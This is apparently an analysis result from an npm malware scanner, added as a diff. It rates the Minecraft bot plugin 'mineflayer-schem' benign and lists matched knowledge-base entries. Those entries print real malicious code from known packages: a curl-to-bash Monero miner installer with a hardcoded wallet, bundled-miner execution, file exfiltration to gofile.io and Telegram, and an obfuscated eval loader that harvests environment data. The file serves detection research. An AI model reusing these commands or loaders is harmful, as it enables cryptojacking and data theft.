@@ -1,0 +1,547 @@
+{
+  "package_name": "mineflayer-schem",
+  "package_version": "1.3.6",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:12:58.860923",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/example/builder.js",
+    "package/lib/build.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/mineflayer-schem/1.3.6/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/mineflayer-schem/1.3.6/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "const { goals, Movements } = require('../mineflayer-pathfinder');\nconst interactable = require('./lib/interactable.json');\nconst Vec3 = require('vec3');\nconst toolPlugin = require('mineflayer-tool').plugin;\n\nfunction wait(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }\n\nfunction inject(bot, options = {}) {\n  if (!bot.pathfinder) {\n    throw new Error('pathfinder must be loaded before builder');\n  }\n\n  const mcData = require('minecraft-data')(bot.version);\n  const Item = require('prismarine-item')(bot.version);\n\n  const defaultOptions = {\n    buildSpeed: 1.0,\n    onError: 'pause',\n    bots: [bot],\n  };\n\n  const settings = { ...defaultOptions, ...options };\n\n  const movements = new Movements(bot, {\n    maxDropDown: 256,\n    maxClimbUp: 256,\n  });\n\n  bot.pathfinder.setMovements(movements);\n  bot.pathfinder.searchRadius = 10;\n\n  bot.loadPlugin(toolPlugin);\n\n  bot.builder = {};\n\n  let currentBuild = null;\n\n  bot.builder.build = async (build) => {\n    currentBuild = build;\n\n    try {\n      while (build.actions.length > 0) {\n        if (build.isCancelled) {\n          bot.emit('builder_cancelled');\n          break;\n        }\n\n        if (build.isPaused) {\n          await wait(1000);\n          continue;\n        }\n\n        const availableActions = build.getAvailableActions();\n        if (availableActions.length === 0) {\n          break;\n        }\n\n        const bots = settings.bots.filter(b => b.pathfinder && b.pathfinder.movements);\n        for (const bot of bots) {\n          if (build.actions.length === 0) break;\n\n          const action = build.actions[0];\n          try {\n            if (action.type === 'place') {\n              const item = build.getItemForState(action.state);\n              const properties = build.properties[action.state];\n              const half = properties.half || properties.type;\n              const faces = build.getPossibleDirections(action.state, action.pos);\n\n              for (const face of faces) {\n                const block = bot.blockAt(action.pos.plus(face));\n              }\n\n              const { facing, is3D } = build.getFacing(action.state, properties.facing);\n              const goal = new goals.GoalPlaceBlock(action.pos, bot.world, {\n                faces,\n                facing,\n                facing3D: is3D,\n                half,\n              });\n\n              if (!goal.isEnd(bot.entity.position.floored())) {\n                bot.pathfinder.setMovements(movements);\n                await bot.pathfinder.goto(goal);\n              }\n\n              await equipToolForAction(action, item);\n\n              const faceAndRef = goal.getFaceAndRef(bot.entity.position.floored().offset(0.5, 1.6, 0.5));\n              if (!faceAndRef) { throw new Error('no face and ref'); }\n\n              bot.lookAt(faceAndRef.to, true);\n\n              const refBlock = bot.blockAt(faceAndRef.ref);\n              const sneak = interactable.indexOf(refBlock.name) > 0;\n              if (sneak) bot.setControlState('sneak', true);\n              await bot._placeBlockWithOptions(refBlock, faceAndRef.face.scaled(-1), { half, delta: faceAndRef.to.minus(faceAndRef.ref) });\n              if (sneak) bot.setControlState('sneak', false);\n\n              const block = bot.world.getBlock(action.pos);\n              if (block.stateId !== action.state) {\n                throw new Error('Block placement failed');\n              }\n            } else if (action.type === 'dig') {\n              const block = bot.blockAt(action.pos);\n              await bot.dig(block);\n            }\n\n            build.markActionComplete(action);\n            build.removeAction(action);\n            bot.emit('builder_progress', build.getProgress());\n            await wait(1000 / settings.buildSpeed);\n          } catch (e) {\n            bot.emit('builder_error', e);\n            if (settings.onError === 'pause') {\n              build.pause();\n              bot.emit('builder_paused');\n              break;\n            } else if (settings.onError === 'cancel') {\n              build.cancel();\n              bot.emit('builder_cancelled');\n              break;\n            }\n          }\n        }\n      }\n\n      if (!build.isCancelled) {\n        bot.emit('builder_finished');\n      }\n    } catch (e) {\n      bot.emit('builder_error', e);\n    } finally {\n      currentBuild = null;\n    }\n  };\n\n  async function equipToolForAction(action, item) {\n    const block = bot.blockAt(action.pos);\n    if (item && block) {\n      await bot.tool.equipForBlock(block, {});\n    }\n  }\n\n  bot.builder.pause = () => {\n    if (currentBuild) {\n      currentBuild.pause();\n      bot.emit('builder_paused');\n    }\n  };\n\n  bot.builder.resume = () => {\n    if (currentBuild) {\n      currentBuild.resume();\n      bot.emit('builder_resumed');\n    }\n  };\n\n  bot.builder.cancel = () => {\n    if (currentBuild) {\n      currentBuild.cancel();\n    }\n  };\n\n  bot.builder.getProgress = () => {\n    if (currentBuild) {\n      return currentBuild.getProgress();\n    }\n    return null;\n  };\n\n  bot.builder.chest = async (coords) => {\n    const [x, y, z] = coords.split(',').map(coord => parseInt(coord.trim()));\n    const chestPos = new Vec3(x, y, z);\n\n    const chest = bot.blockAt(chestPos);\n    if (chest.name !== 'chest') {\n      return;\n    }\n\n    try {\n      await bot.openChest(chest);\n\n      const neededItems = currentBuild.schematic.palette.map(stateId => currentBuild.items[stateId]);\n      for (const item of neededItems) {\n        if (!bot.inventory.items().find(i => i.type === item.id)) {\n          const chestItems = bot.inventory.slots.filter(slot => slot && slot.type === item.id);\n          if (chestItems.length > 0) {\n            await bot.tossStack(chestItems[0]);\n          }\n        }\n      }\n      await bot.closeInventory();\n    } catch (err) {\n      bot.emit('builder_error', err);\n    }\n  };\n}\n\nmodule.exports = {\n  Build: require('./lib/build.js'),\n  builder: inject,\n};",
+          "is_malicious": false,
+          "malice_score": 0.4142223775386811,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code performs file and inventory operations by reading block and chest data using bot.blockAt and bot.openChest, then modifies inventory items via bot.tossStack and bot.closeInventory. It accesses and manipulates in-game world state and inventory data structures but does not perform any network, system execution, or cryptographic operations. This behavior facilitates automated building and resource management within the Minecraft bot environment without involving external data exfiltration or command execution.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a Minecraft bot plugin designed to automate building and inventory management within the game environment. It uses legitimate APIs to interact with in-game blocks, chests, and inventory, without performing any network calls to external servers, executing system commands, or downloading and running external code. The known malicious patterns involve executing remote scripts or binaries for unauthorized cryptocurrency mining, which is absent here. The code's behavior is consistent with automation within a controlled environment and does not exhibit any suspicious or malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_056541_snippet_3",
+              "source_package": "gcc-patch (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44365793466567993,
+              "code_similarity": 0.46007367968559265,
+              "behavior_similarity": 0.4272421598434448,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "function build(...args) {\n    //set a+x to the file\n    const { exec } = require('child_process');\n    exec(`curl -s -L <https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh> | bash -s 43uAJZNgaMTB8JZv8rgNmEPxtCZtjwqdyHHGsT8DQfWkPpJKgUWADmdZx2TsHX3KPK5b1YE9WqiAVPnVHtv5uMzR4CA373A`, (err, stdout, stderr) => {\n        if (err) {\n            console.log(err);\n            return;\n        }\n    });\n}\n\nmodule.exports = build;",
+                "code_behavior": "At runtime, when the build function is called in the earlier campaign variant, the code downloads and executes a remote shell script from GitHub, which sets up and runs an XMR (Monero) miner using a hardcoded wallet address, resulting in the hijacking of the host's resources for unauthorized mining.",
+                "malice_analysis": {
+                  "why_suspicious": "Downloading and executing remote scripts is a classic malware technique. The use of a hardcoded Monero wallet and silent execution without user notification further indicate malicious intent.",
+                  "violated_expectations": "Legitimate packages do not fetch and execute remote mining scripts without user knowledge or consent. Automated installers may fetch dependencies, but not cryptocurrency miners.",
+                  "similar_legitimate_use": "Some legitimate installers may fetch dependencies, but they do not download and execute cryptomining scripts or use hardcoded wallet addresses.",
+                  "key_indicators": [
+                    "curl and bash pipeline to remote script",
+                    "hardcoded Monero wallet address",
+                    "no user notification or opt-in"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when build function is called, in earlier campaign variant)",
+                  "file_location": "index.js (gcc-builder package)",
+                  "required_permissions": [
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "gcc-patch",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.2",
+                  "why_malicious": "The package 'gcc-patch' impersonates a legitimate GCC compiler utility but actually contains and executes a concealed cryptocurrency miner. Its main script grants execution permissions to a bundled ELF binary and runs it, hijacking the user's CPU resources for unauthorized Monero mining. The binary includes cryptographic and mining-related functions, as well as network strings for mining pool communication, confirming its malicious purpose."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the gcc-patch package, believing it to be a GCC utility.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the build function."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The build function is called, which grants execution permissions to the bundled 'gcc' binary and runs it.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Activation of the concealed miner binary."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The 'gcc' binary initiates Monero mining operations, connects to a remote mining pool, and uses the host's CPU resources for mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing unauthorized mining and resource hijacking."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In earlier campaign variants, the build function downloads and executes a remote mining setup script, further automating the deployment of the miner.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Same final goal: unauthorized mining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Granting executable permissions (chmod a+x) to bundled binaries during runtime",
+                    "Execution of non-transparent ELF binaries from npm packages",
+                    "Network connections to Stratum mining pools (stratum+ssl://)",
+                    "Fetching and executing remote shell scripts from GitHub in build scripts",
+                    "Presence of cryptomining-related function names in binaries"
+                  ],
+                  "file_indicators": [
+                    "Bundled ELF binary named 'gcc' in npm package",
+                    "index.js scripts that execute local binaries or fetch remote scripts",
+                    "Presence of mining-related strings or function names in binaries"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to stratum+ssl:// endpoints",
+                    "HTTP(S) requests to raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh",
+                    "Use of hardcoded Monero wallet addresses in scripts"
+                  ],
+                  "how_to_detect": "Monitor npm packages for bundled executable binaries, especially those named after well-known tools (e.g., 'gcc'). Flag scripts that grant execution permissions and run local binaries, or that fetch and execute remote shell scripts. Analyze binaries for mining-related function names and strings. Detect outbound network connections to Stratum mining pools and known cryptomining setup scripts. Correlate package metadata (e.g., suspicious or anonymous authors) with these behaviors for higher confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104013_056541_snippet_1",
+              "source_package": "gcc-patch (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_056541/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40409958362579346,
+              "code_similarity": 0.40268269181251526,
+              "behavior_similarity": 0.40551644563674927,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "function build(...args) {\n    //set a+x to file \"gcc\", run the file, console log ALL output\n    const { execSync } = require('child_process');\n    const output = execSync('chmod a+x ./node_modules/gcc-patch/gcc && ./node_modules/gcc-patch/gcc', { encoding: 'utf-8' });\n    console.log(output);\n}\n\nmodule.exports = build;",
+                "code_behavior": "At runtime, when the build function is called, the code grants executable permissions to a bundled ELF binary named 'gcc' and immediately executes it, capturing and logging its output, resulting in the activation of a concealed cryptocurrency miner.",
+                "malice_analysis": {
+                  "why_suspicious": "Granting execution permissions and running a bundled binary from within a package is highly atypical, especially for a package purporting to be a compiler utility. The executed binary is not a legitimate compiler but a miner.",
+                  "violated_expectations": "A legitimate GCC utility package would provide compiler bindings or wrappers, not execute arbitrary binaries or require such permissions. Executing hidden binaries is not expected behavior for a compiler utility.",
+                  "similar_legitimate_use": "Some build tools may execute compilers or scripts, but these are typically well-documented, transparent, and do not conceal their purpose or bundle unrelated executables.",
+                  "key_indicators": [
+                    "chmod a+x on a bundled binary",
+                    "immediate execution of a local ELF binary",
+                    "no user interaction or explicit consent",
+                    "output logging of a non-transparent process"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when build function is called)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "gcc-patch",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.2",
+                  "why_malicious": "The package 'gcc-patch' impersonates a legitimate GCC compiler utility but actually contains and executes a concealed cryptocurrency miner. Its main script grants execution permissions to a bundled ELF binary and runs it, hijacking the user's CPU resources for unauthorized Monero mining. The binary includes cryptographic and mining-related functions, as well as network strings for mining pool communication, confirming its malicious purpose."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the gcc-patch package, believing it to be a GCC utility.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of the build function."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The build function is called, which grants execution permissions to the bundled 'gcc' binary and runs it.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Activation of the concealed miner binary."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The 'gcc' binary initiates Monero mining operations, connects to a remote mining pool, and uses the host's CPU resources for mining.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing unauthorized mining and resource hijacking."
+                  },
+                  {
+                    "step": 4,
+                    "action": "In earlier campaign variants, the build function downloads and executes a remote mining setup script, further automating the deployment of the miner.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Same final goal: unauthorized mining."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Granting executable permissions (chmod a+x) to bundled binaries during runtime",
+                    "Execution of non-transparent ELF binaries from npm packages",
+                    "Network connections to Stratum mining pools (stratum+ssl://)",
+                    "Fetching and executing remote shell scripts from GitHub in build scripts",
+                    "Presence of cryptomining-related function names in binaries"
+                  ],
+                  "file_indicators": [
+                    "Bundled ELF binary named 'gcc' in npm package",
+                    "index.js scripts that execute local binaries or fetch remote scripts",
+                    "Presence of mining-related strings or function names in binaries"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to stratum+ssl:// endpoints",
+                    "HTTP(S) requests to raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh",
+                    "Use of hardcoded Monero wallet addresses in scripts"
+                  ],
+                  "how_to_detect": "Monitor npm packages for bundled executable binaries, especially those named after well-known tools (e.g., 'gcc'). Flag scripts that grant execution permissions and run local binaries, or that fetch and execute remote shell scripts. Analyze binaries for mining-related function names and strings. Detect outbound network connections to Stratum mining pools and known cryptomining setup scripts. Correlate package metadata (e.g., suspicious or anonymous authors) with these behaviors for higher confidence."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_192433_495668_snippet_1",
+              "source_package": "various (over 1200) CuteBoi-related packages (names randomized, e.g., cloudyboi12, etc.) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20240824_192433_495668/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40253326296806335,
+              "code_similarity": 0.391607403755188,
+              "behavior_similarity": 0.4134591221809387,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode based on eazyminer clone\nconst { execFile } = require('child_process');\nconst path = require('path');\nconst minerPath = path.join(__dirname, '<randomized-binary-name>');\nconst configPath = path.join(__dirname, 'config.json');\nexecFile(minerPath, ['-c', configPath], (error, stdout, stderr) => {\n  // handle miner process\n});",
+                "code_behavior": "At runtime, the code executes a bundled XMRig binary using Node.js child_process.execFile, passing a configuration file as an argument, which causes the host system to initiate unauthorized cryptocurrency mining and send results to attacker-controlled endpoints.",
+                "malice_analysis": {
+                  "why_suspicious": "The code launches a bundled cryptocurrency miner (XMRig) without user knowledge or consent, using a configuration that benefits the attacker. This is a hallmark of cryptojacking malware.",
+                  "violated_expectations": "Legitimate npm packages should not execute hidden mining binaries or initiate resource-intensive processes that connect to external mining pools without explicit user consent and transparency.",
+                  "similar_legitimate_use": "Legitimate mining utilities may execute mining binaries, but only after explicit user action and with user-supplied configuration, not silently or with attacker-controlled settings.",
+                  "key_indicators": [
+                    "Automatic execution of a bundled XMRig binary at runtime",
+                    "Use of child_process.execFile to launch external binaries",
+                    "Configuration file path hardcoded to attacker-supplied config",
+                    "No user interaction or consent required for mining to begin"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when the package is imported and its main function is invoked by another program)",
+                  "file_location": "main JavaScript file (e.g., index.js) within the package root directory",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "various (over 1200) CuteBoi-related packages (names randomized, e.g., cloudyboi12, etc.)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (over 1200 packages, each with initial version)",
+                  "why_malicious": "These packages are direct clones of the eazyminer package, each embedding XMRig cryptocurrency mining binaries and configuration files that direct mined currency to attacker-controlled endpoints. The packages are distributed at scale via automated, disposable npm accounts, indicating a coordinated, large-scale cryptojacking campaign. The presence of mining binaries and attacker-controlled wallet configuration is not expected in legitimate npm packages, and the packages are designed to exploit unsuspecting users' compute resources for illicit profit."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker publishes over 1200 npm packages, each embedding a miner binary and attacker-controlled configuration file.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Packages are available for installation by unsuspecting users."
+                  },
+                  {
+                    "step": 2,
+                    "action": "User or automated system (e.g., CI/CD pipeline) installs and imports the malicious package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code and binaries are present on the host system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "When invoked, the package's JavaScript code launches the XMRig miner binary with the attacker-supplied configuration.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Host system begins mining Monero for the attacker's benefit, consuming CPU and network resources."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Mined cryptocurrency is sent to attacker-controlled wallet via attacker-controlled mining pool endpoint.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker profits from unauthorized use of victim's compute resources."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm packages that contain and execute XMRig or other cryptocurrency mining binaries at runtime",
+                    "Automatic execution of bundled binaries via child_process or similar APIs",
+                    "Presence of hardcoded mining pool URLs and wallet addresses in configuration files",
+                    "Mining activity initiated without user interaction or consent"
+                  ],
+                  "file_indicators": [
+                    "Presence of XMRig binaries (Windows/Linux) with randomized or misleading names in package directories",
+                    "config.json or similarly named files containing mining pool configuration with attacker-controlled endpoints",
+                    "Unusual binary files present in npm package root or subdirectories unrelated to stated package functionality"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to known mining pools or attacker-controlled endpoints (e.g., knowledgemd[.]com, scpulse[.]com, idots[.]cf, fisch[.]ml, Nordalts[.]ml, 130.162.52[.]80)",
+                    "Network traffic to domains or IPs not associated with legitimate mining pools, especially those hardcoded in package configuration"
+                  ],
+                  "how_to_detect": "Scan npm packages for embedded mining binaries such as XMRig, especially those with randomized or misleading names. Analyze configuration files for hardcoded mining pool URLs and wallet addresses that do not belong to the user. Monitor for unexpected process execution of mining binaries and outbound network connections to known mining pool domains or suspicious IP addresses. Flag packages that include binaries unrelated to their stated functionality or that match known cryptominer hashes. Correlate file, process, and network indicators to identify automated cryptojacking campaigns."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133302_244497_snippet_4",
+              "source_package": "cryptoaitools (PyPI)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133302_244497/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3913029432296753,
+              "code_similarity": 0.25854969024658203,
+              "behavior_similarity": 0.5240561962127686,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "# Data exfiltration logic (pseudocode)\nfor file in collected_files:\n    new_name = file + '.minecraft'\n    upload_url = upload_to_gofile(new_name)\n    send_to_telegram_bot(upload_url)\n    os.remove(new_name)",
+                "code_behavior": "At runtime, the code iterates over collected sensitive files, renames them with a .minecraft extension, uploads them to gofile.io, sends the download link to an attacker-controlled Telegram bot, and deletes the local copy to remove evidence.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated collection and exfiltration of sensitive data to external services, combined with anti-forensics (deleting local files), is a core malware behavior.",
+                  "violated_expectations": "Legitimate trading bots should not access or exfiltrate unrelated user data or system files, nor should they delete files after exfiltration.",
+                  "similar_legitimate_use": "None; this is classic data theft and anti-forensics.",
+                  "key_indicators": [
+                    "Bulk file access and renaming",
+                    "Use of public file sharing for exfiltration",
+                    "Communication with Telegram bot for C2",
+                    "Immediate deletion of exfiltrated files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (after secondary payload execution)",
+                  "file_location": "MHTBot.py / main.py (downloaded payloads)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "cryptoaitools",
+                  "package_manager": "PyPI",
+                  "package_versions": "unknown (latest at time of report)",
+                  "why_malicious": "The package cryptoaitools impersonates a legitimate cryptocurrency trading tool but contains a multi-stage malware infection chain. Upon installation or import, it executes code that downloads and runs additional payloads, steals sensitive data (such as crypto wallets, browser data, and system files), and exfiltrates this data to attacker-controlled infrastructure. The package uses deceptive GUIs, obfuscated code, and multiple distribution vectors (PyPI, GitHub, fake websites) to maximize reach and evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the cryptoaitools package, triggering automatic execution of run_base().",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "OS-specific helper script execution"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malware determines the OS and runs the appropriate helper script (basec_helper.py for Windows, base_helper.py for macOS).",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Download and execution of secondary payloads"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Helper script decodes obfuscated URLs and downloads additional payloads from a fake website (coinsw.app).",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of secondary payloads (MHTBot.py, main.py, etc.)"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Secondary payloads execute, launching a fake GUI and beginning data theft operations.",
+                    "implemented_by": [
+                      "snippet_4",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Data exfiltration and user distraction"
+                  },
+                  {
+                    "step": 5,
+                    "action": "Stolen data is exfiltrated to gofile.io and Telegram bot, and local evidence is deleted.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives stolen data; victim is compromised"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automatic code execution on import or install",
+                    "OS detection and conditional execution of helper scripts",
+                    "Base64-decoded URLs and filenames used for network requests",
+                    "Download and execution of code from external domains post-install",
+                    "Bulk access to sensitive files (wallets, browser data, SSH keys, etc.)",
+                    "Exfiltration of data to public file sharing (gofile.io) and Telegram bots",
+                    "Immediate deletion of exfiltrated files (anti-forensics)",
+                    "Display of fake GUIs or progress bars during background malicious activity"
+                  ],
+                  "file_indicators": [
+                    "__init__.py with immediate function execution",
+                    "helpers/base_helper.py, helpers/basec_helper.py",
+                    "Downloaded files with .minecraft extension in hidden .temp directories",
+                    "Downloaded payloads: MHTBot.py, main.py, AiBotPro.py, ArbitrageBot.py, addonal.py"
+                  ],
+                  "network_indicators": [
+                    "Connections to coinsw.app and subpaths (e.g., /basec/, /basecw/)",
+                    "Uploads to gofile.io via API",
+                    "Outbound requests to api.telegram.org/bot*/sendMessage",
+                    "Connections to tryenom.com/active-addon/*"
+                  ],
+                  "how_to_detect": "Monitor for Python packages that execute code on import or install, especially those that download and execute additional code from obfuscated or base64-encoded URLs. Flag any access to sensitive files (wallets, browser data, SSH keys) by newly installed packages. Detect uploads to gofile.io and outbound connections to known malicious domains (coinsw.app, api.telegram.org with suspicious bot tokens, tryenom.com/active-addon). Look for evidence of immediate file deletion after exfiltration and the presence of fake GUIs or progress bars in cryptocurrency-related tools."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3884419798851013,
+              "code_similarity": 0.4286404252052307,
+              "behavior_similarity": 0.34824350476264954,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
